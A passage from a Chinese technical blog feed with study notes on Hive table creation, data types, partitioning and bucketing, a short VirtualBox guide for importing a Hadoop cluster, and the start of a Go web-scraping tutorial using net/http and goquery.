class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  建表语法中的语法顺序需要和语法树中的一致</p></li></ol><h2 id="Hive数据类型"><a href="#Hive数据类型" class="headerlink" title="Hive数据类型"></a>Hive数据类型</h2><ol><li><p>  数据类型指的是表中列的字段类型</p></li><li><p>  分为：原生数据类型和复杂数据类型</p></li><li><p>  原生数据类型包括：数值类型、时间日期类型、字符串类型、杂项数据类型；</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114210333.png"></p></li><li><p>  复杂数据类型包括：array数组、map映射、struct结构、union联合体。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114210350.png"></p></li><li><p>  因为底层是用Java写的，所以支持Java的数据类型，比如字符串string</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114210535.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114210636.png"></p></li><li><p>  显示类型转换使用CAST函数</p></li></ol><pre><code> <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">CAST(&#39;100&#39; as INT) -- 会将字符串100转换为100整数值-- 如果强制类型转换失败，函数会返回NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></code></pre><ol start="12"><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114211004.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114211011.png"></p></li></ol><h3 id="默认分隔符"><a href="#默认分隔符" class="headerlink" title="默认分隔符"></a>默认分隔符</h3><ol><li>  Hive建表时如果没有row format语法指定分隔符，则采用默认分隔符，是用来分隔字段的，默认的分割符是‘\001’，是一种特殊的字符，使用的是ASCII编码的值，键盘是打不出来的。</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114211310.png"></li><li>  在vim编辑器中，连续按下Ctrl+v/Ctrl+a即可输入’\001’ ，显示^A</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114211526.png"></li><li>  在一些文本编辑器中将以SOH的形式显示：</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114211637.png"></li></ol><h2 id="Hive数据存储路径"><a href="#Hive数据存储路径" class="headerlink" title="Hive数据存储路径"></a>Hive数据存储路径</h2><ol><li><p>将数据放在表目录下，即可映射数据到Hive表中</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">hadoop fs -put stuent2.txt &#x2F;user&#x2F;hive&#x2F;warehouse&#x2F;mydb1.db&#x2F;student2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  在Hive建表的时候，可以<strong>通过location语法</strong>来<strong>更改数据在HDFS上的存储路径</strong>，使得建表加载数据更加灵活方便。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114212524.png"></p></li></ol><h2 id="查看Hive表的结构"><a href="#查看Hive表的结构" class="headerlink" title="查看Hive表的结构"></a>查看Hive表的结构</h2><ol><li><p>  describe 表名</p></li><li><p>  显示Hive中表的元数据信息，如果指定了EXTENDED关键字，则它将以Thrift序列化形式显示表的所有元数据；如果指定了FORMATTED关键字，则它将以表格格式显示元数据。</p></li><li><p>取表中指定的数据创建一个新表，使用AS指定SQL查询语句，查询语句的结果即为新表的结构和内容</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">create table if not exists student5 as select id,name from student1 where age &gt;&#x3D; 20;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="LIKE创建表"><a href="#LIKE创建表" class="headerlink" title="LIKE创建表"></a>LIKE创建表</h2><ol><li><p>使用LIKE创建一张表结构与某个表相同的新表，新表中内容为空。</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">create table if not exists student6 like student1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  类似于拷贝一张表的结构</p></li></ol><h2 id="元数据和主数据的区别"><a href="#元数据和主数据的区别" class="headerlink" title="元数据和主数据的区别"></a>元数据和主数据的区别</h2><ol><li>  <strong>元数据</strong>：即<strong>关于数据的数据</strong>，用以描述数据及其环境的结构化信息，便于查找、理解、使用和管理数据。</li><li>  <strong>主数据</strong>：主数据则定义企业核心业务对象，如客户、产品、地址等，与交易流水信息不同，主数据一旦被记录到数据库中，需要经常对其进行维护，从而确保其时效性和准确性；主数据还包括关系数据，用以描述主数据之间的关系，如客户与产品的关系、产品与地域的关系、客户与客户的关系、产品与产品的关系等。</li></ol><h2 id="Hive的内部表和外部表"><a href="#Hive的内部表和外部表" class="headerlink" title="Hive的内部表和外部表"></a>Hive的内部表和外部表</h2><ol><li><p>  <strong>内部表也被称为被Hive拥有和管理的托管表</strong></p></li><li><p>  默认情况下创建的表就是内部表，Hive拥有该表的结构和文件。换句话说，Hive完全管理表（元数据和数据）的生命周期，类似于RDBMS中的表。</p></li><li><p>  当删除内部表时，会删除数据以及表的元数据（元数据指的是数据的属性信息，而不是具体的数据）</p></li><li><p>可以使用DESCRIBE FORMATTED table_name 来获取表的元数据信息，从中可以看出表的类型</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">DESCRIBE FORMATTED table_name;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114220742.png"></p></li><li><p>  外部表：外部表中的数据不是Hive拥有或管理的，只管理表元数据的生命周期</p></li><li><p>  要创建一个外部表，需要使用EXTERNAL关键字</p></li><li><p>  删除外部表只会删除元数据，而不会删除实际数据，在Hive外部仍然可以访问实际数据</p></li></ol><h3 id="内外部表的相同和不同之处"><a href="#内外部表的相同和不同之处" class="headerlink" title="内外部表的相同和不同之处"></a>内外部表的相同和不同之处</h3><ol><li>  都会在Hive <strong>Metastore中管理</strong>表的定义、字段类型等<strong>元数据信息</strong></li><li>  删除<strong>内部表</strong>时，除了会从Metastore中删除表元数据，还<strong>会从HDFS中删除其所有数据文件</strong>。</li><li>  删除<strong>外部表</strong>时，只会从Metastore中删除表的元数据，并<strong>保持HDFS位置中的实际数据不变</strong>。</li></ol><h2 id="DDL表的修改和删除"><a href="#DDL表的修改和删除" class="headerlink" title="DDL表的修改和删除"></a>DDL表的修改和删除</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114222014.png"></p></li><li><p>drop语句可以指定垃圾桶</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">drop table [if exists] table_name [PURGE];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114222116.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114222252.png"></p></li></ol><h2 id="普通表数据加载"><a href="#普通表数据加载" class="headerlink" title="普通表数据加载"></a>普通表数据加载</h2><h3 id="加载本地数据"><a href="#加载本地数据" class="headerlink" title="加载本地数据"></a>加载本地数据</h3><ol><li><p>创建一张普通表</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">create table t_student(num int,name string,sex string,age int,dept string)row format delimited fields terminated by &#39;,&#39;;-- delimited fields的意思是分隔字段，delimited指分隔的-- fields 字段-- terminated by 终止于-- 行格式分隔符，采用行格式进行分隔<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将本地数据加载进这张普通表中</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">load data local inpath 本地文件及路径 [overwrite] into table 表明;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114191539.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114191546.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114191558.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114191604.png"></p></li></ol><h3 id="加载HDFS中的数据"><a href="#加载HDFS中的数据" class="headerlink" title="加载HDFS中的数据"></a>加载HDFS中的数据</h3><pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">load data inpath &#39;&#x2F;hivedata&#x2F;student.txt&#39; overwrite into table t_student;-- 没有local参数即为从HDFS中取数据并加载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114191829.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114191833.png"></p></li></ol><h3 id="插入数据-insert-select-需要执行MR程序"><a href="#插入数据-insert-select-需要执行MR程序" class="headerlink" title="插入数据 insert + select (需要执行MR程序)"></a>插入数据 insert + select (需要执行MR程序)</h3><pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">insert into table table_name select xxx from othertablename;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114192009.png"></li></ol><h2 id="分区表"><a href="#分区表" class="headerlink" title="分区表"></a>分区表</h2><h3 id="分区表的产生原因"><a href="#分区表的产生原因" class="headerlink" title="分区表的产生原因"></a>分区表的产生原因</h3><ol><li>  where语句的背后需要进行全表扫描才能过滤出结果，对于hive来说需要扫描每一个文件。如果数据文件个数特别多的话，扫描效率很慢也没必要。</li><li>  如果只需求需要一个archer.txt文件，只需要扫描archer.txt文件即可，如何优化可以加快查询，减少全表扫描呢？</li><li>  指定文件扫描和全表扫描，效率还是存在差异的。</li><li>  分区表的创建目的就是为了减少扫描文件的大小，减少全表扫描的概率，提高效率</li><li>  当Hive表对应的数据量大、文件个数多时，<strong>为了避免查询时全表扫描数据</strong>，Hive<strong>支持根据指定的字段对表进行分区</strong>，分区的字段可以是日期、地域、种类等具有标识意义的字段。</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115163907.png"></li></ol><h2 id="分区表的创建和数据加载"><a href="#分区表的创建和数据加载" class="headerlink" title="分区表的创建和数据加载"></a>分区表的创建和数据加载</h2><ol><li><p><strong>分区字段不能与表中已经存在的字段同名</strong>，分区字段可以<strong>以虚拟字段的形式</strong>显示在表结构的最后</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">--分区表建表语法CREATE TABLE table_name ( column1 data_type, column2 data_type,....) PARTITIONED BY (partition1 data_type, partition2 data_type,…);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">create table t_all_hero_part(id int,name string,hp_max int,mp_max int,attack_max int,defense_max int,attack_range string,role_assist string) partitioned by (role_main string) -- 这里是分区字段row format delimitedfields terminated by &quot;\t&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115164953.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115165209.png"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115165921.png"></p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">load data local inpath &#39;&#x2F;root&#x2F;hivedata&#x2F;archer.txt&#39; into table t_all_hero_part partition(role_main&#x3D;&#39;sheshou&#39;);load data local inpath &#39;&#x2F;root&#x2F;hivedata&#x2F;assassin.txt&#39; into table t_all_hero_part partition(role _main &#x3D;&#39;cike&#39;);load data local inpath &#39;&#x2F;root&#x2F;hivedata&#x2F;mage.txt&#39; into table t_all_hero_part partition(role _main &#x3D;&#39;fashi&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  我的理解是：实际字段可以不包含<strong>源数据</strong>中的所有列，但是<strong>实际字段+虚拟字段（partition字段）要能对应源数据中的每一个列</strong></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115173138.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115173304.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115173248.png"></p></li></ol><h3 id="分区表和普通表的区别"><a href="#分区表和普通表的区别" class="headerlink" title="分区表和普通表的区别"></a>分区表和普通表的区别</h3><ol><li>  外表上看起来分区表好像没多大变化，实际上<strong>分区表在底层管理数据的方式发生了改变</strong>。</li><li>  普通表</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115190253.png"></li><li>  分区表</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115190301.png"></li><li>  分区的概念提供了一种<strong>将Hive表数据分离为多个文件/目录的方法</strong>。</li><li>  <strong>不同分区对应着不同的文件夹</strong>，同一分区的数据存储在同一个文件夹下</li><li>  这种指定分区查询的方式叫做<strong>分区裁剪</strong>。</li></ol><h3 id="分区表的重点在于"><a href="#分区表的重点在于" class="headerlink" title="分区表的重点在于"></a>分区表的重点在于</h3><ol><li><p>  建表时根据业务场景<strong>设置合适的分区字段</strong>。比如日期、地域、类别等</p></li><li><p>查询的时候尽量<strong>先使用where进行分区过滤</strong>，查询<strong>指定分区的数据</strong>，<strong>避免全表扫描</strong></p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">select count(*) from t_all_hero where role_main&#x3D;&#39;archer&#39; and hp_max &gt; 5800;select count(*) from t_all_hero where role_main&#x3D;&#39;sheshou&#39; and hp_max &gt; 5800;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  分区字段不能和表中已有的字段同名</p></li><li><p>  分区字段是虚拟字段，其数据并不存储在底层的文件中</p></li><li><p>  分区字段值的确定来自于<strong>用户价值数据手动指定</strong>（静态分区）或者根据<strong>查询结果位置自动推断</strong>（动态分区）</p></li><li><p>  Hive<strong>支持多重分区</strong>，也就是说在分区的基础上继续分区，划分更加细粒度</p></li></ol><h3 id="分区表的数据加载"><a href="#分区表的数据加载" class="headerlink" title="分区表的数据加载"></a>分区表的数据加载</h3><h4 id="动态分区插入"><a href="#动态分区插入" class="headerlink" title="动态分区插入"></a>动态分区插入</h4><ol><li><p>  所谓<strong>动态分区指的是分区的字段值是基于查询结果（参数位置）自动推断出来的</strong>。</p></li><li><p>核心语法就是insert+select</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">insert into table table_name PARTITION(分区字段) SELECT *** FROM othertable_name;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>启动动态分区需要开启动态分区功能，在hive会话中设置几个参数</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">set hive.exec.dynamic.partition&#x3D;true; -- 是否开启动态分区功能set hive.exec.dynamic.partition.mode&#x3D;nonstrict; -- 指定动态分区模式，分为nonstrick非严格模式和strict严格模式 , strict严格模式要求至少有一个分区为静态分区set hive.exec.max.dynamic.partitions&#x3D;50000;set hive.exec.max.dynamic.partitions.pernode&#x3D;10000;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">-- 创建一张表create table t_usa_covid19(count_date string,county string,state string,fips int,cases int,deaths int)row format delimitedfields terminated by &#39;,&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-- 将所有的数据都加载进去hadoop fs -put us-covid19-countries.dat /user/hive/warehouse/mydb2.db/t_usa_covid19<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115193714.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115193953.png"></p></li><li><p>多重分区表</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">partitioned by (partition1 data_type,partition2,data_type,...)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  多重分区下，分区之间是一种递进关系，可以理解为<strong>在前一个分区的基础上继续分区</strong>。从HDFS的角度来看就是<strong>文件夹下继续划分子文件夹</strong>。</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115194448.png"></p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">--单分区表，按省份分区create table t_user_province (id int, name string,age int) partitioned by (province string);--双分区表，按省份和市分区create table t_user_province_city (id int, name string,age int) partitioned by (province string, city string);--三分区表，按省份、市、县分区create table t_user_province_city_county (id int, name string,age int) partitioned by (province string, city string,county string);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="对于分区表的DDL操作"><a href="#对于分区表的DDL操作" class="headerlink" title="对于分区表的DDL操作"></a>对于分区表的DDL操作</h3><ol><li><p>  主要包括：增加分区，删除分区，修改分区</p></li><li><p>增加分区：</p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">alter table 表名 add partition (分区字段)location &#39;分区字段需要的数据文件所在的HDFS位置&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="分桶表"><a href="#分桶表" class="headerlink" title="分桶表"></a>分桶表</h2><ol><li><p>  分桶表对应的数据文件<strong>在底层会被分解为若干个部分</strong>，通俗来说就是<strong>被拆分成若干个独立的小文件</strong>。</p></li><li><p>  在分桶时，要指定根据哪个字段将数据分为几桶（几个部分）。</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221115203849.png"></p>  <pre class="line-numbers language-hive" data-language="hive"><code class="language-hive">create [external] table [db_name.]table_name[(col_name data_type,...)]clustered by(col_name) -- clustered by 根据哪个字段进行分into N buckets; -- 分成几桶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>virtual导入hadoop集群</title>
      <link href="/virtualbox%E5%AF%BC%E5%85%A5hadoop%E9%9B%86%E7%BE%A4/"/>
      <url>/virtualbox%E5%AF%BC%E5%85%A5hadoop%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="virtualbox导入Hadoop集群"><a href="#virtualbox导入Hadoop集群" class="headerlink" title="virtualbox导入Hadoop集群"></a>virtualbox导入Hadoop集群</h1><ol><li>  导出虚拟电脑，导出默认为.ova格式</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108222022.png"></li><li>  选择要导出的虚拟机</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108222046.png"></li><li>  导入虚拟电脑，选择路径，直接指向第一步导出的.ova格式文件</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108221530.png"></li><li>  启动hadoop集群和启动hive都没有问题</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221114111909.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go爬虫项目</title>
      <link href="/go%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE/"/>
      <url>/go%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="go爬虫项目"><a href="#go爬虫项目" class="headerlink" title="go爬虫项目"></a>go爬虫项目</h1><h2 id="爬虫步骤"><a href="#爬虫步骤" class="headerlink" title="爬虫步骤"></a>爬虫步骤</h2><ol><li>  明确目标(确定在哪个网站搜索)</li><li>  爬（爬下内容）</li><li>  取（筛选想要的内容）</li><li>  处理数据（按照你的想法进行处理）</li></ol><h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><ol><li><p>  构造客户端</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221105110355.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> client http<span class="token punctuation">.</span>Client<span class="token comment">//Client类型代表HTTP客户端。它的零值（DefaultClient）是一个可用的使用DefaultTransport的客户端。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>构造get请求</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">reqList<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> URL<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token comment">//返回值是Request包和一个错误类型的值，Request中包含了请求头，请求体（get请求没有请求体），host值等信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>添加请求头,为了防止浏览器检测到爬虫访问，添加一些请求头来伪造成浏览器访问</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Connection"</span><span class="token punctuation">,</span> <span class="token string">"keep-alive"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Pragma"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept"</span><span class="token punctuation">,</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept-Language"</span><span class="token punctuation">,</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">)</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>发送请求</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">resp<span class="token punctuation">,</span>err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token comment">//client的Do方法，将接收一个request类型的参数，发送request请求，返回http回复，第一个参数接收，接收的参数自动为Response类型</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"请求失败"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//程序在使用完回复后必须关闭回复的主体，defer关键字类似于其它语言的析构函数，释放对应内存，Close()函数关闭</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221105162556.png"></p></li></ol><h2 id="解析网页"><a href="#解析网页" class="headerlink" title="解析网页"></a>解析网页</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go">docDetail <span class="token punctuation">,</span>err <span class="token operator">:=</span> goquery<span class="token punctuation">.</span><span class="token function">NewDocumentFromReader</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token comment">//NewDocumentFromReader函数将从response的body内返回一个文档，解析为html并返回给第一个参数，如果不能解析为html，则返回错误作为第二个值</span><span class="token comment">//docDetail接收的是解析后的html文件</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"解析失败"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221105162225.png"></li></ol><h2 id="获取节点信息"><a href="#获取节点信息" class="headerlink" title="获取节点信息"></a>获取节点信息</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221105163708.png"></p></li><li><p>  github.com/PuerkitoBio/goquery包内内置了Find函数，”Find 获取当前匹配元素集中每个元素的后代，由选择器过滤。,它返回一个包含这些匹配元素的新选择对象。”</p></li><li><p>  内置了Each函数，“每个迭代一个 Selection 对象，为每个匹配的元素执行一个函数。<strong>它返回当前的 Selection 对象。</strong>函数 f 为选择中的每个元素调用，该选择中元素的索引从 0 开始，*Selection 仅包含该元素”</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221105164020.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">docDetail<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"#content > div > div.article > ol > li > div"</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token comment">//列表,使用Document.Find创建初始选择，然后用类似jQuery的可链接语法和方法进行操作</span><span class="token function">Each</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">,</span>s <span class="token operator">*</span> goquery<span class="token punctuation">.</span>Selection<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//在列表里面继续找，第一个参数代表的是索引</span>title <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.hd > a > span:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>img <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.pic > a > img"</span><span class="token punctuation">)</span> <span class="token comment">//img标签 -> src属性里面</span>imgTmp <span class="token punctuation">,</span> ok <span class="token operator">:=</span> img<span class="token punctuation">.</span><span class="token function">Attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">)</span>info <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>score <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > div > span.rating_num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>quote <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p.quote > span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ok <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span>title<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"imgTmp"</span><span class="token punctuation">,</span>imgTmp<span class="token punctuation">)</span>fmt<span class="token 